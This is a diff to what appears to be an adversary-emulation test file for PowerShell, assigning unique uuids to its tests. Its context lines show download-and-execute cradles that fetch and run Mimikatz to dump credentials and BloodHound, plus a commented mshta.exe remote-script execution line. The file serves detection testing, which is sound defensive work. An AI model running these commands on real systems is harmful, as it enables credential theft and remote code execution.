@@ -4,7 +4,7 @@ display_name: PowerShell
 
 atomic_tests:
 - name: Mimikatz
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: f4ad8b54-9e01-4242-b44a-8f377f392d63
 
   description: |
     Download Mimikatz and dump credentials
@@ -24,7 +24,7 @@ atomic_tests:
       powershell.exe 'IEX (New-Object Net.WebClient).DownloadString("#{mimurl}"); Invoke-Mimikatz -DumpCreds'
 
 - name: BloodHound
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: d9eb7d08-0247-4882-9677-2c7f55b6aefb
 
   description: |
     Download Bloodhound and run it
@@ -44,7 +44,7 @@ atomic_tests:
       powershell.exe "IEX (New-Object Net.WebClient).DownloadString(\"#{bloodurl}\"); Invoke-BloodHound"
 
 - name: Obfuscation Tests
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: 5dc7b710-0ef4-4730-9e50-fcfc13e8009e
 
   description: |
     Different obfuscated methods to test
@@ -62,7 +62,7 @@ atomic_tests:
 
 # @todo need to be fixed
 # - name: Mimikatz - Cradlecraft PsSendKeys
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: c870a7d3-4a0d-4da8-a8cc-f76e4db74160
 
 #   description: |
 #     Run mimikatz via PsSendKeys
@@ -78,7 +78,7 @@ atomic_tests:
 
 #  @todo need to be fixed
 # - name: Invoke-AppPathBypass
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: b245bb1d-a63b-4879-9f24-708682834ba9
 
 #   description: |
 #     Note: Windows 10 only
@@ -95,7 +95,7 @@ atomic_tests:
 #       C:\Windows\System32\cmd.exe
 
 - name: PowerShell Add User
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: 0e1707b2-8553-4b14-9b6e-68dd467b76ae
 
   description: |
     Using PS 5.1, add a user via CLI
@@ -127,7 +127,7 @@ atomic_tests:
 
 # @todo need to be fixed
 # - name: Powershell MsXml COM object - no prompt
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: 7fa4b46c-23bf-4097-bb32-3bec4ae2a0eb
 
 #   description: |
 #     Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -150,7 +150,7 @@ atomic_tests:
 
 # @todo
 # - name: Powershell MsXml COM object - with prompt
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: 7793aa66-51aa-4c18-ad7c-d55d6fede25e
 
 #   description: |
 #     Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -173,7 +173,7 @@ atomic_tests:
 
 # @todo
 # - name: Powershell XML requests
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: 53558992-2ce2-489e-bb1e-52f5cbc3a97d
 
 #   description: |
 #     Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -195,7 +195,7 @@ atomic_tests:
 
 #@todo
 # - name: Powershell invoke mshta.exe download
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: 16ac6f4b-24fd-4431-9325-310c0af6324f
 
 #   description: |
 #     Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -216,7 +216,7 @@ atomic_tests:
 #       "C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
 
 - name: Powershell Invoke-DownloadCradle
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: 568ce5f9-ed9e-4771-89e4-9c47d85faed4
 
   description: |
     Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -233,7 +233,7 @@ atomic_tests:
 
 #@todo
 # - name: PowerShell Fileless Script Execution
-  uuid: e3ce4c49-88a2-411c-8239-ffd7b077579e
+  uuid: 06648f54-1d74-4e99-a9a4-3fd227da26b4
 
 #   description: |
 #    Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections.
